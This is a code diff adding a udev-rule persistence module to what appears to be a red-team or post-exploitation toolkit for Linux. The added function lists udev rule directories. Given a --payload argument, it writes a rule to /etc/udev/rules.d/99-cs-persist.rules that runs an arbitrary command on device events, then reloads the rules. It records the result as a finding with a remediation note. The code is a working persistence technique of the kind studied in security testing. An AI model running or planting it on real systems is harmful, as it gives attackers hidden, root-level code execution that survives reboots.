@@ -487,3 +487,49 @@ atq 2>/dev/null
 
   return { output: output.join("\n"), findings }
 }
+
+export async function udevRulesPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Udev Rules Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const trigger = argVal(args, "--trigger") || 'add'
+
+  const script = `
+echo "--- Udev Rules Directories ---"
+ls -la /etc/udev/rules.d/ 2>/dev/null || echo "[-] /etc/udev/rules.d/ not found"
+ls -la /lib/udev/rules.d/ 2>/dev/null | head -10
+echo ""
+echo "--- Udev Status ---"
+udevadm info --version 2>/dev/null || echo "[-] udevadm not available"
+echo ""
+${payload ? `
+echo "--- Installing Udev Rule ---"
+if [ -w /etc/udev/rules.d/ ] || [ "$(id -u)" = "0" ]; then
+  echo 'ACTION=="${trigger}", RUN+="${payload}"' > /etc/udev/rules.d/99-cs-persist.rules 2>/dev/null
+  udevadm control --reload-rules 2>/dev/null
+  echo "[+] Udev rule installed: /etc/udev/rules.d/99-cs-persist.rules (trigger: ${trigger})"
+else
+  echo "[-] Root required to write udev rules"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> --trigger <action> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Udev rule installed")) {
+    findings.push({
+      checkId: "LNX-UDEV-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "/etc/udev/rules.d/99-cs-persist.rules",
+      title: "Udev rule persistence installed",
+      details: `Udev rule triggers on ACTION=="${trigger}" — executes payload on device events`,
+      remediation: "Audit /etc/udev/rules.d/ for unauthorized rules. Remove and run udevadm control --reload-rules.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
